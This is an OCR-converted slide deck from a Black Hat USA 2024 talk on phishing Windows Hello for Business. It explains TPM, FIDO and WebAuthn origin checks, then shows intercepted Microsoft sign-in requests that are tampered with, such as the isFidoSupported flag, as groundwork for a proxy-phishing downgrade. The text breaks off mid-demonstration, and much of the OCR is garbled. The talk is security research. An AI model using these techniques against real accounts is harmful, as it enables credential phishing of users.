---
title: "Hook, Line and Sinker Phishing Windows Hello for Business"
speakers: ["Yehuda Smirnov"]
conference: "Black Hat"
conference_full: "Black Hat USA 2024"
edition: "USA"
year: 2024
source_pdf: "Black Hat USA 2024 slides/Yehuda Smirnov_Hook, Line and Sinker Phishing Windows Hello for Business.pdf"
pages: 139
sha256: "b7dc87db72e4a7001f962d3a4bb3cf0036c90c4b754c1e212de6654c5a16615e"
text_chars: 35053
ocr_pages: 56
has_ocr: true
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-11T21:42:55Z"
---
# Hook, Line and Sinker Phishing Windows Hello for Business

**Speakers:** Yehuda Smirnov  
**Conference:** Black Hat USA 2024  
**Source:** `Black Hat USA 2024 slides/Yehuda Smirnov_Hook, Line and Sinker Phishing Windows Hello for Business.pdf` (139 pages)

## Slide 1

HOOK, LINE AND SINKER: PHISHING WINDOWS HELLO FOR BUSINESS

Yehuda Smirnov

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
black hat — -
USA 2024
AUGUST 7-8, 2024
BRIEFINGS
HOOK, LINE AND SINKER:
PHISHING WINDOWS HELLO FOR
BUSINESS
#BHUSA @BlackHatEvents
```

## Slide 2

## ABOUT ME

R E D T E A M & SE C U R I TY R E SE A RCH ER @ A C C E N T U RE SE C U R I T Y I SR A E L

@y ud as m _ on t wit t e r

- Like learning & researching Windows, Active Directory, Azure and anything interesting

- Develop in C, C#, Python & Assembly

###### Ye h ud a S m irnov

- Ex private investigator

- Like to surf & play tennis

## Slide 3

ABOUT ME
@y ud as m _ on t wit t e r
• Like learning & researching Active
Directory, Windows, Azure and
anything interesting
• Develop in C, C#, Python & Assembly
• Ex private investigator
Ye h ud a S m irnov • Like to surf & play tennis

## Slide 4

## AGENDA

- Intro to Windows Hello For Business (WHfB)

- Understanding WebAuthn API

- Investigation

- Proxy Phishing

- Mitigations

## Slide 5

## INTRODUCTION

- Windows Hello for Business (WHfB from now on) is considered a **phishing resistant authentication method** .

- • Discovered a method to phish Windows Hello for Business

## Slide 6

## WINDOWS HELLO

## Slide 7

## WINDOWS HELLO

## Slide 8

## WINDOWS HELLO

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
WINDOWS HELLO
o Windows Security
Accounts > Sign-in options
Making sure it’s you Ways to sign in
1Password is trying to unlock.
«+ _ Facial recognition (Windows Hello)
Sign in with your camera (Recommended)
PIN
| forgot my PIN
gs Fingerprint recognition (Windows Hello)
@ gerp g
Sign in with your fingerprint scanner (Recommended)
_ Sign in with a PIN (Recommended)
```

## Slide 9

## WINDOWS HELLO - TPM

- The TPM - Trusted Platform Module is a chip located on the motherboard / CPU, which stores cryptographic keys directly in the hardware.

## Slide 10

## WINDOWS HELLO - TPM

**Enrollment** - Windows Hello pin is hashed & stored in the TPM

## Slide 11

## WINDOWS HELLO - TPM

**Enrollment** - Windows Hello pin is hashed & stored in the TPM **Authentication** - provide Windows Hello Pin, which is sent to the TPM

## Slide 12

## WINDOWS HELLO - TPM

**Enrollment** - Windows Hello pin is hashed & stored in the TPM **Authentication** - provide Windows Hello Pin, which is sent to the TPM **Verification** - TPM verifies the pin by comparing the input PIN to the hash stored

## Slide 13

## WINDOWS HELLO FOR BUSINESS

## Slide 14

## WINDOWS HELLO FOR BUSINESS

## Slide 15

## WINDOWS HELLO FOR BUSINESS

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
WINDOWS HELLO FOR
BUSINESS
Microsoft
Sign-in options
```

## Slide 16

## WINDOWS HELLO FOR BUSINESS

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
WINDOWS HELLO FOR
BUSINESS
Windows Security
Sign in with your passkey
To sign in to “login.microsoft.com”, choose a passkey.
This request comes from the app “brave.exe” by “Brave Software,
Inc.”.
Microsoft
e someuser@gmai.com
a? Face, fingerprint, PIN or security
More choices
| a someuser@gmai.com
ay user@company.com
+++ Use another device
```

## Slide 17

## WINDOWS HELLO FOR BUSINESS

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
WINDOWS HELLO FOR
BUSINESS
o Windows Security
Making sure it’s you Microsoft
Sign in with your passkey to “login.microsoft.com" as Face, fi ngerp ri nt, PIN or secu rity
“user@company.com".
This request comes from the app “brave.exe” by “Brave Software,
Inc.”.
| forgot my PIN
```

## Slide 18

## WINDOWS HELLO FOR BUSINESS

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
WINDOWS HELLO FOR
BUSINESS
EMM 0 0 oof sete
Azure services
Resources
```

## Slide 19

## FIDO KEYS

• Fido Keys may act as a replacement for the TPM’s role in the authentication • Can store cryptographic keys on them • Also called Yubi keys, **physical authenticators** , security keys, etc

## Slide 20

## DEFAULT AUTHENTICATION

- After performing successful authentication via Azure, the default authentication method is set to that method

- • **(Today it is no longer the case)**

## Slide 21

- DEFAULT AUTHENTICATION • After performing successful authentication via Azure, the default authentication method is set to that method

- **(Today it is no longer the case)**

- **Today the default authentication is the strongest one available**

## Slide 22

## DEFAULT AUTHENTICATION

## Slide 23

## DEFAULT AUTHENTICATION

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
DEFAULT
AUTHENTICATION
Windows Security
Sign in with your passkey
To sign in to “login.microsoft.com”, choose a passkey.
This request comes from the app “brave.exe” by “Brave Software,
Inc.”.
Microsoft
e someuser@gmai.com
a? Face, fingerprint, PIN or security
More choices
| a someuser@gmai.com
ay user@company.com
+++ Use another device
```

## Slide 24

## WINDOWS HELLO FOR BUSINESS

Windows Hello for  Administrator
Traditional
Businesss
Passwords

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
WINDOWS HELLO FOR
BUSINESS
Windows Hello for Achanimistrator
Buisiinesss
Traditional
Passwords
a #
2
```

## Slide 25

## WINDOWS HELLO FOR BUSINESS

Traditional
Passwords

**Can’t you just phish that password too?**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
WINDOWS HELLO FOR
BUSINESS
Windows Hello for
Birsiinesss
-
Traditional » "
Passitio gels {
Aciamimistrator
Y
```

## Slide 26

WINDOWS HELLO FOR
BUSINESS
Windows Hello for  Administrato
Traditional
Webauthn API
Businesss r
Passwords
Phisher
Can’t you just phish that
password too?

## WINDOWS HELLO FOR BUSINESS

## Slide 27

## DEMONSTRATION

## Slide 28

DEMONSTRATION - ATTACKER’S SITE

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
DEMONSTRATION - ATTACKER'’S SITE
```

## Slide 29

DEMONSTRATION - FAILED PHISH

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
“DEMONSTRATION - FAILED PHISH
Ld Windows Security
Sign in with your passkey
To sign in to “attackercom". choose a device with a saved
passkey.
Security key
More choices
oe iPhone, iPad, or Android device
| A Security key
```

## Slide 30

DEMONSTRATION - FAILED PHISH

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
“DEMONSTRATION - FAILED PHISH
Ld Windows Security
Cian tn antl wena nacelles
To sign in to “attacker.com", choose a device with a saved
passkey.
fe iPhone, iPad, or Android device
| A Security key
Next Cancel
```

## Slide 31

## WEBAUTHN

## API

## Slide 32

## WEBAUTHN API

Protects against phishing

* https://developer.mozilla.org/enUS/docs/Web/API/Web_Authentication_API

## Slide 33

## WEBAUTHN API

Protects against
phishing

Reduces impact in case of breach

* https://developer.mozilla.org/enUS/docs/Web/API/Web_Authentication_API

## Slide 34

## WEBAUTHN API

Protects against
phishing

Reduces impact in case of breach

Protects against password attacks

- https://developer.mozilla.org/en-

- US/docs/Web/API/Web_Authentication_API

## Slide 35

## WEBAUTHN API

- Enables creation and use of secure, scoped and verified public key based credentials.

Protects against phishing

Reduces impact in case of breach

Protects against password attacks

* https://developer.mozilla.org/enUS/docs/Web/API/Web_Authentication_API

## Slide 36

## MECHANISMS

Challenge

Signature

Origin Check

Assertion

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
MECHANISMS
a atatababatatadbatatatatatabitabatatatetee A
‘WWW. @@0 )
2
G7" ™=
Challenge Signature Origin Check Assertion
```

## Slide 37

## MECHANISMS - CHALLENGE

Challenge

## Slide 38

## MECHANISMS - CHALLENGE

#### Challenge

- Unique challenge (nonce) issued by the server

- • Must be signed using the appropriate private key • Private key is stored in the TPM / Fido key

## Slide 39

## MECHANISMS - SIGNATURE

Signature

## Slide 40

## MECHANISMS - SIGNATURE

#### Signature

- Client browser interacts with the operating system

- • Signs the challenge using the user's private key (commonly in TPM / Fido)

## Slide 41

## MECHANISMS - ORIGIN CHECK

Origin Check

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
MECHANISMS - ORIGIN CHECK
 ceeeenemeen
‘WW. @@@ |
2
o™
Origin Check
```

## Slide 42

## MECHANISMS - ORIGIN CHECK

#### Origin Check

- Origin defined by protocol (http / https) , hostname (domain) , and port - **https** :// **example.com** : **443**

- Origin field is a header, automatically set by the browser, likely to prevent domain spoofing

- Checked by both client browser and server

## Slide 43

## MECHANISMS - ASSERTION

Assertion

## Slide 44

## MECHANISMS - ASSERTION

#### Assertion

- Client returns the encrypted challenge, along with the origin field

- Both are signed with the private key

- This entire package is termed - assertion

## Slide 45

## MECHANISMS - ASSERTION

#### Assertion

- Client returns the encrypted challenge, along with the origin field

- • Both are signed with the private key

- This entire package is termed - assertion

## Slide 46

## MECHANISMS - ASSERTION

Assertion

- Client returns the encrypted challenge, along with the origin field

- • Both are signed with the private key

- This entire package is termed - assertion

## Slide 47

## MECHANISMS

Challenge

Signature

Origin Check

Assertion

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
MECHANISMS
a atatababatatadbatatatatatabitabatatatetee A
‘WWW. @@0 )
2
G7" ™=
Challenge Signature Origin Check Assertion
```

## Slide 48

MECHANISMS
Why so secure?
Challenge Asymmetric  Origin Check Assertion
Encryption

## MECHANISMS

## Slide 49

ARCHITECTURE

## Slide 50

ARCHITECTURE - REGISTRATION

## Slide 51

## ARCHITECTURE - REGISTRATION

Physical Authenticator

Browser

TPM / Software

WebAuthn Register

Server Server Side Web App “Relying Party”

**Step 1**

- User logs in with username & password/MFA

- Chooses to create a new credential (e.g. Fido / WHfB)

## Slide 52

## ARCHITECTURE - REGISTRATION

Browser
WebAuthn
WebAuthn API in  Client Side
Register
browser JavaScript
Client Platform
Physical
Authenticator
TPM /
Software
Step 2

Server Server Side Web App “Relying Party”

- Server ("Relying-party") script runs in the client browser

## Slide 53

## ARCHITECTURE - REGISTRATION

Browser

WebAuthn API in Client Side browser JavaScript Client Platform Physical Authenticator TPM / Software **Step 2**

TPM / Software

Server Server Side Web App “Relying Party”

- Server ("Relying-party") script runs in the client browser

- Utilizes the Client Platform (user-agent header and device - laptop, mobile)

## Slide 54

## ARCHITECTURE - REGISTRATION

Browser

WebAuthn API in browser Client Platform Physical Authenticator **Step 3**

TPM / Software

Server Server Side Web App “Relying Party”

- Client platform connects to the authenticator (e.g., Fido / TPM)

- • Requests an authorization gesture from the user (e.g., fingerprint, Windows Hello)

## Slide 55

## ARCHITECTURE - REGISTRATION

Physical Authenticator **Step 3**

Browser

WebAuthn API in browser

Client Platform

TPM / Software

Server Server Side Web App “Relying Party”

- Client platform connects to the authenticator (e.g., Fido / TPM)

- • Requests an authorization gesture from the user (e.g., fingerprint, Windows Hello)

## Slide 56

## ARCHITECTURE - REGISTRATION

Browser

Server

Physical Authenticator **Step 4**

WebAuthn API in browser

Client Platform

TPM /

Software

Server Side Web App “Relying Party”

- If authorized, a new credential (private key) is created

## Slide 57

SECURITY - CREDENTIAL

## Slide 58

## SECURITY - CREDENTIAL

Public Key

## Slide 59

## SECURITY - CREDENTIAL

Public Key

Private Key

## Slide 60

## ARCHITECTURE - REGISTRATION

Physical Authenticator **Step 4**

Browser

**Private Key**

TPM /

Software

Server

Server Side Web App

“Relying Party”

- Stored within the authenticator (TPM / Fido)

## Slide 61

## ARCHITECTURE - REGISTRATION

Browser **Public Key**

Server Server Side Web App “Relying Party”

Physical Authenticator **Step 5**

TPM / Software

• Credential's public key is sent to the server

- Attestation containing additional information is also sent

## Slide 62

ARCHITECTURE - AUTHENTICATION

## Slide 63

## ARCHITECTURE - AUTHENTICATION

Browser

Server

Client Side JavaScript

Server Side Web App

“Relying Party”

Physical Authenticator **Step 1**

TPM / Software

- Server ("Relying-Party") serves a script to users

## Slide 64

## ARCHITECTURE - AUTHENTICATION

Browser
WebAuthn API in  Client Side
browser JavaScript
Physical
Authenticator
TPM /
Software
Step 1

Server Server Side Web App “Relying Party”

- Script requests an challenge (nonce) from the server

## Slide 65

## ARCHITECTURE - AUTHENTICATION

Physical Authenticator **Step 1**

Browser WebAuthn API in Client Side browser JavaScript

TPM / Software

Server Server Side Web App “Relying Party”

- Script requests an challenge (nonce) from the server

- Server returns the challenge to the client

## Slide 66

## ARCHITECTURE - AUTHENTICATION

Browser

WebAuthn API in Client Side browser JavaScript

Physical Authenticator **Step 1**

TPM / Software

- Interacts with the WebAuthn API

Server Server Side Web App “Relying Party”

## Slide 67

## ARCHITECTURE - AUTHENTICATION

Browser
WebAuthn API in
browser
Client Platform
Physical
Authenticator
TPM /
Software
Step 2

Server
Server Side Web
App
“Relying
Party”

- Browser utilizes the client platform to request hardware authorization

## Slide 68

## ARCHITECTURE - AUTHENTICATION

Server
Browser
WebAuthn API in
Server Side Web
browser
App
“Relying
Party”
Client Platform
Physical
Authenticator
TPM /
Software
Step 2

- Following user authorization, client platform searches for potential credentials (relevant private key)

## Slide 69

## SECURITY - ORIGIN

##### **WebAuthn API**

Microsoft.com
user1
user2

Github.com
user3
user4

## Slide 70

## SECURITY - ORIGIN

What credentials
are available for
Microsoft.com?

##### **WebAuthn API**

Microsoft.com
user1
user2

Github.com
user3
user4

## Slide 71

## SECURITY - ORIGIN

user 1
user 2

##### **WebAuthn API**

Microsoft.com
user1
user2

## Slide 72

## SECURITY - ORIGIN

**No access to another domain’s (origin) credentials**

##### **WebAuthn API**

**Microsoft.com user1 user2**

## Slide 73

ARCHITECTURE - AUTHENTICATION

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
ARCHITECTURE - AUTHENTICATION
7 Windows Security
Sign in with your passkey
To sign in to} “login. microsoft.com”) choose a passkey.
This request comes from the app "brave.exe” by “Brave Software,
Inc.”.
user] @gmail.com
e
mf
More choices
| 2 user |@gmail.com
ay user2@company2.com
«++ Use another device
```

## Slide 74

## ARCHITECTURE - AUTHENTICATION

Browser

Server

Physical Authenticator

**Step 4**

Client Platform

TPM / Software

Server Side Web App

“Relying Party”

- Client platform signs the challenge using stored private key (Fido key / TPM / software)

## Slide 75

## ARCHITECTURE - AUTHENTICATION

Browser

Server

Server Side Web App

“Relying Party”

Physical Authenticator

**Step 4**

TPM /

Software

- Client platform signs the challenge using stored private key (Fido key / TPM / software)

## Slide 76

## ARCHITECTURE - AUTHENTICATION

Browser

Assertion
Physical
Authenticator
TPM /
Software
Step 4

Server Server Side Web App “Relying Party”

- Client returns the signed assertion (includes challenge) to server.

## Slide 77

## ARCHITECTURE - AUTHENTICATION

Assertion

Server

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
ARCHITECTURE - AUTHENTICATION
T/T /
AN
"type": "webauthn.get",
"challenge": "Ty5leUowZ...snip...jJxRFBPbkoyREXxFWVNn",
"origin": "https://Login.microsoft.com",
"crossOrigin":false,
"other_keys_can_be_added_here":
"do not compare clientDataJSON against a template. See https://goo.gl/yabPex"
a
a
a
a
```

## Slide 78

## ARCHITECTURE - AUTHENTICATION

Is this
Server
me?
Assertion

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
ARCHITECTURE - AUTHENTICATION
"type": "webauthn.get",
"challenge": "Ty5leUowZ...snip...jJIxRFBPb
"origin": "https://Login.microsoft.com",
"crossOrigin":false,
"other_keys_can_be_added_here":
"do not compare clientDataJSON against a template. See https://goo.gl/yabPex"
a
a
T/T /
AN
```

## Slide 79

## ARCHITECTURE - AUTHENTICATION

Server

## Slide 80

ARCHITECTURE
When you finally get to know
WebAuthn API after all those slides

## Slide 81

INVESTIGATION

## Slide 82

## INVESTIGATION

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
INVESTIGATION
Nnonewnre
wow]
POST /common/Login HTTP/2
Host: Login.microsoftonLine.com
Cookie: ...snip...
Origin: https://lLogin.microsoft.com
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebkit/537.36 (KHTML, Like Gecko)
Chrome/125.0.6422.112 Safari/537.36
_type=23&ps=23&assertion=
| %7B%221d%22%3A%22LAVOnNVKYSVIUNPdizHid632FEzb7Gi_NrGnHkr6paZE%22%2C%22c LientDataJSON%22%3A%22eyJOeXBLIjoid
2ViYXVOaG4uZ2VOTiwiY2hhbGxLbmd1L 1 joiVHk1lbGVVb3daVmhCYVUScFNrdFdNVkZwVEVOS2FHSKhHZMmxQYVVWVFZYCEpNVTVwULhOSm
JItY3haRUSKTmtsck1VaFVTRVp4VDFSb1YxUnNILSFpYUj BaSFdtNUNTMUV3U25kYU1Fa3dVMjFHVECONVNga3VawWGxL YUdSWFVXbFBhVW9
| 4WTIwMEStS LhiR3BqYLRSNLLqSmFNRT LOV2SCYVJ6ZZIXVEpvYUdKSGVHeGLiV1JZU1dsM2FXRLLUbNBKYWOScF LVaFNNROSJVFRaTWVU
| bHpZakprYOdkcES5YUmhWMDU1WWpOT2RscHVVWFZaTWpsMFNXbDDNhVOZYUmpCSmFtOTRUbDNBGT LULVVkZbESHbDUYOVEVOS 2RWbHRXV2xQY
WtVe LRWUnINVTU2ULhsT2VrVnpTVZFXTKdORFNUWKSWRO4OVDFSVKOWwMXFWVES5SOVORBdVJEAHVURUpuV LdObLRWT LVhbXhkV j BKamRwwk
tUR3BsWDIxUGVXbZNaMnhPVHpVeEdwRk1URUZFVVVnMk1USmLj e LZNVEHZNWRrVkpUVXRMUj ISCOLFRLVNMOIJqV1Uxd1ZGVLdUakF3Umx
| WUFFqTnLVMj LpY1ROdFdTMTRTMVFSTm1iKeE4zZFdPRmRwVnpswF LuVkSWV2g2UmxGe LFXcGZRbF JOT jNKSmIrZGZWMmhoZGpCbk5IaEJk
| VipmTLVjMVZURNINM1ZGWLZwWGVGaDVSMWc1VTNOeGNWaHZSRFpVVLULSFQyUnJVSEJHUTA1cO9GWNhSMEpVWmsxcLZsOTIKVEJyYUZGb
| kK9UaFLVMDVLZVVOSVVHVLpj SFoOTWWSTGRFS LNaMnBZWTNOc1IwULhTbUZMVEhFMmJrR j ZPSFIwU3pawVVVRNITVK42VLRCbFMxVm9 jbL
EOZEhHKUWItNXBLDLZUUVUNMIRHVnJISMLpYWKZCRF LsVXpaRWxWwWwVVNd2NVeEZVeLZtUORCVFNSUNBRRVJsYONKUF JuaHRaa3g2UZBwbFU
| xOVRaMUoxWkhCZ1 LrMWihakp4UkZCUGIrb3LSRXhGV1ZObiIsIm9yaWdpbil6ImhOdHBz0i8vbG9nawW4ubwlL jcm9zb2ZOLmNvbSIsImNy
| b3NZT3I3pZ2Lulj pmYwxzZSwib3RoZXJfa2V5c19j YwW5fYmVFYWRKZWRFaGVyZSI6ImRvIGSvdCBjb21wYXJILIGNsaWVudERhdGFKUO90I
```

## Slide 83

INVESTIGATION

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
INVESTIGATION
me oo
tat
— "id": "LAVONVKYSV1UNPdizHid632FEzb7Gi_NrGnHkr6paZE",
7 "cLlientDataJSON": "eyJOeXBLIjoid2ViYXVOaG4uZ2VOliwi...snip....mdsL3LhYLBLecJ9",
"authenticatorData": "NWyelKCTIbLpXx6vkYID8bVfaJ2mH7yWwGEwVfdpoDIEFAAAAAA"
° "signature":
- "bg6usSvVuUFFJZyM56z3Ef vKOMyANpvsSuYnTHLDSd9m609V1Yhr—kc20ZWOGFOcIzb8KjKIXMt1BWK
eUL74_QEp8a61hTIOUX9PkKXxd-NPUUICLcBUxqdLdV77SGUx8qs8ne3Hrbmb_PLFVKU2uTVFLfxJIqBgmk
ChSHPHH5XFJOv3YZVpG22i5MxqcM4VqRyVFxb65hMvoBemwa95V LKayBSSKyA3MbhPqaSrTGb5ogwePh
wOtLEU4LEvKthInptHvRDquJubOcI3ntOYkplvx4Z_3wjnc8VLzfpD2SULOVX3daEpI8nDNrp_SkKx5gA
OfnD6IBY4acS973XDvxXtwrcQ"
"userHandLle":
"TOUGOT1L54UDkKIbUmxXKRmO3ZFv6yOUtU jew3xhW78NWIE2_GoM7JpaLF8WPJICkBLe7Nna5"
}
```

## Slide 84

## INVESTIGATION

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
INVESTIGATION
"signature":
"bg6usSvVUuUFFIZyM56z3EfvKOMyANpvsSuYnTHLDSd9m609V1Yhr—kc2O0ZWOGFOcIzb8KjKIXMt1BWK
eUL74_QEp8a61hTIOUX9PkKXxd-NPUUICLcBUxqdLdV77SGUx8qs8ne 3Hrbmb_PLFVKU2uTVFLfxiqBgmk
ChSHPHH5XFJOv3YZVpG22i5MxqcM4VqRyVFxb65hMvoBemwa95V LKayBSSKyA3MbhPqaSrTGb5ogwePh
wOtLEU4LEvKthInptHvRDquJubOcI3ntOYkplvx4Z_3wjnc8VLzfpD2SULOVX3daEpI8nDNrp_SKx5gA
OfnD6IB4acS973XDvxXtwrcQ",
"userHandLe":
"TOUGOT1LS5S4UDkKIbUmMXKRmO3ZFv6yOutU jew3xhW78NWIE2_GoM7JpaLF8WPJICkKBLe7Nna5S -
}
```

## Slide 85

INVESTIGATION

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
INVESTIGATION
"type": "webauthn.get",
"challenge":
"Ty5 LeUowZVhBaU9SpSktWMVFpTENKaGJHY2 LPaUpTVXpIMUS5pSXNJbmcxZENINKLYMUhUSEZxTIROV1IR
reHZXROZHWmSCS1EwSndaMEkwU21GTGNSS jkuZX LKaGRXUWLPaUoxY20ONmIXbGpjbTL6Y j JaMEOtwWnB
aRzg2WTJoaGJHeGxibWRsSW1L3awFYTnpJam9pYUHSMGNITTZMeTLZYj JkcGIpNXRhVO55Y jNOdLpuUXV
ZMj LOSWL3aWF XR j BJam94TnpFNUSUY3 LNamN4TENKdV LtWWwLPakUZTVRrMUS5S6SX LOekVZSW1IWNGNDSTZ
NVGNUTLRVMO1qVTNNWDAURDhUTEInVWtnTVNUamxJVOJ jdVZKTGpLX21PeWo3Z2x0TZUxXNOFMTEFEUUg
2MTJiczVMTHYSdkVITUtLR2ZRWMEFUM3B jWULWVFVWT jAWRLVPQJNyU29icTNtWS14S10yNmIxN3dwoFd
pVzLXYnVNVWh6RLFZQWpfOLRNN3dJbkdfV2hhd j BnNHhBdWZfNUc1VnFrM3VFZVpXeFh5R1g5U3NxcVh
VRDZUVUS5HT 2RrUHBGQO5sOFZxROIJUZKIrVLO2ZdTBraFFnOThYUOSKEUNIUGVZCHZUMLOLAEIJSZ2pYY3N
SRORXSmFLTHE2bKF60HROSZZYUUFrSVN6VTBLS1VocnQddHdQbmS5penVTQWM3TGVrR2ZXZFBDYLUZZEL
pLU19TZ1J1ZHBfYk1majJxRFBPbkoyREXFWVNn",
Moin Ea Mi //login.microsoft.com",
"other_keys_can_be_added_here":
"do not compare clientDataJSON against a template. See https://goo.gl/yabPex"
```

## Slide 86

INVESTIGATION

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
INVESTIGATION
[ Sage oy
}
“a
"type": "webauthn.get",
"challenge":
"Ty5 LeUowZVhBaUSpSktWMVFpTENKaGJHY2 LPaUpTVXpJIMUSpSXNJIbmcxZENINKLYMUhHUSEZxT1RoOV1R
reHZXROZHWmSCS1EwSndaMEkwU21GTGNSS jkuZX LKaGRXUWLPaUoxY200NmJXbGpjbTL6Yj JaME9twnB
aRzg2WTJoaGJHeGxibWRsSWL3awFYTnpJam9pYUhSMGNITTZMeTLzY j JkKcGIpPNXRhHVO55Y JNOdLpuUXV
ZMj LOSWL3aWFXRjBJam94 TnpFNUSUY3 LNamN4TENKdVLtWwWlPakUzTVRrMU56SX LOekVZSWIWNGNDSTZ
NVGN4UTLRVMO1LqVTNNWDAURDhUTEInVWtnTVNUamxJIVOIjdVZKTGpLX21PeWo3Z2x0TZUxXNOFMTEFEUUg
2MTJicZVMTHYSdkVITUtLR2RWMEFUM3B jWULWVFVWT j AWRLVPQjNyU29icTNtWS14S10yNmJxN3dWwoFd
pVZLXYNVNVWh6RLFZQWpfQOLRNN3dJbkdfV2hhd j BnNHhBdWZfNUcC1VnFrM3VFZVpXeFhSR1gSU3NxcVh
VRDZUVU5HT 2RrUHBGQO5sOFZxXROJUZKIrVLO2ZdTBraFFnOThYUO5KeEUNIUGVZCHZ4UMLOLAEIJSZ2pYY3N
SRORXSmFLTHE2bKF60HROSZZYUUFrSVN6VTBLS1VocnQudHdObmS5penVTQWM3TGVrR2ZXZFBDYLUZZEL
|VYUMwcUxFUzVmSDBTSLRpdERLcHdPRnhtZkx6SOpLU19TZ1I1ZHBFYK1maj IXxRFBPbkoyREXFWVNn",
"origin": "https://lLogin.microsoft.com",
"crossOrigin":false,
"“other_keys_can_be_added_here":
"do not compare clientDataJSON against a template. See https://goo.gl/yabPex"
```

## Slide 87

## INVESTIGATION

## Slide 88

INVESTIGATION

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
INVESTIGATION
Microsoft
Sign-in options
```

## Slide 89

INVESTIGATION

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
INVESTIGATION
1 | POST /common/GetCredentialType?mkt=en-US HTTP/1.1
2 Host: Login.microsoftonLline.com
3 Cookie: ..snip...
4y User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebkit/537.36 (KHTML, Like Gecko) Chrome/126.0.6478.57
Safari/537.36
5 Content-Length: 1938
6 Content-Type: application/json; charset=UTF-8
7 Accept-Encoding: gzip, deflate, br
g Priority: u=1, i
11 |
"username": "user@company.com",
"isOtherIdpSupported": true,
"checkPhones":false,
"isRemoteNGCSupported":true,
"isCookieBannerShown": false,
"isFidoSupported":true,
"originalRequest": "rQQTARAAhZK_j9tOAMXjJ5C...snip...SydXuficv_Qc1i",
"country": "IL",
"forceotcLlogin":false,
"isExternalFederationDisallowed": false,
"isRemoteConnectSupported":false,
"federationFlags":0,
"isSignup":false,
"fLowToken": "AQABIQEAAAApT. ..snip...E4gigE4wgAA"
"isAccessPassSupported": true
```

## Slide 90

INVESTIGATION

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
INVESTIGATION
POST /common/GetCredentialType?mkt=en-US HTTP/1.1
Host: Login.microsoftonline.com
Cookie: ..snip...
\User—Agent: Mozilla/5.0 (Windows NT 10.0; Win6é4; x64) AppleWebKkit/537.36 (KHTML, Like Gecko) Chrome/126.0.6478.57
|\Safari/537.36
Content-Length: 1938
Content-Type: application/json; charset=UTF-8
Accept-Encoding: gzip, deflate, br
Priority: u=1, i
{
"username": "user@company.com",
"isOtherIdpSupported":true,
"checkPhones": false,
"isRemoteNGCSupported":true,
"isCookieBannerShown": false,
| "isFidoSupported":true,|
WoriginalRequest”: "rQQIARAAhZK_j9tOAMXj5C. ..snip
"country": "IL",
"forceotclogin":false,
"isExternalFederationDisallowed": false,
"isRemoteConnectSupported":false,
"federationFlags":0,
"isSignup":false,
...SydXuficv_Qci",
"fLowToken": "“AQABIQEAAAApT...snip...E4gigE4wgAA",
"isAccessPassSupported": true
```

## Slide 91

## INVESTIGATION

• **Modifying IsFidoSupported does not work as of today**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
INVESTIGATION
¢ Modifying IsFidoSupported does not work as of today
|POST /common/GetCredentialType?mkt=en-US HTTP/1.1
Cookie: ..snip...
1
2 Host: Login.microsoftonLine.com
3
4
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebkit/537.36 (KHTML, Like Gecko) Chrome/126.0.6478.57
safari/537.36
5 Content-Length: 1938
6 Content-Type: application/json; charset=UTF-8
7 Accept-Encoding: gzip, deflate, br
g |Priority: u=1, i
La |
"username": "user@company.com",
"isOtherIdpSupported":true,
"checkPhones": false,
"isRemoteNGCSupported":true,
"isCookieBannerShown": false,
"isFidoSupported":true,|
VoriginaLlRequest": "rQQIARAAhZK_j9tOAMXJ5C...snip...SydXuflcv_Qc1",
"country": "IL",
"forceotclogin":false,
"isExternalFederationDisallowed": false,
"isRemoteConnectSupported": false,
"federationFlags":0,
"isSignup":false,
"flowToken": "AQABIQEAAAApT...snip...E4gigEdwgAA",
"isAccessPassSupported": true
```

## Slide 92

## DEMONSTRATION

## Slide 93

## DEMONSTRATION - SIGN IN

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
DEMONSTRATION - SIGN IN
Microsoft
Sign in
yehuda.smirnov@company.com
No account? Create one!
Canta your account?
CY Sign-in options
```

## Slide 94

DEMONSTRATION - INTERCEPT

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
DEMONSTRATION - INTERCEPT
POST /common/GetCredentialType?mkt=en-US HTTP/1.1
Host: Login.microsoftonLine.com
Cookie: ..snip...
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0)
Gecko/20100101 Firefox/127.9
Origin: https://Login.microsoftonLine.com
"username": "yehuda.smirnov@company.com",
"isOtherIdpSupported":true,
"checkPhones": false,
"isRemoteNGCSupported": true,
"isCookieBannerShown": false,
"isFidoSupported":true,
"originalRequest":
"rQQIARAAhZI_bONOGIbtpE3...snip. . .FUOGUZUFzZCqTpVPu3rcV5PcK8g8
1",
"country": "IL",
"forceotcLogin": false,
"isExternalFederationDisallowed": false,
"isRemoteConnectSupported": false,
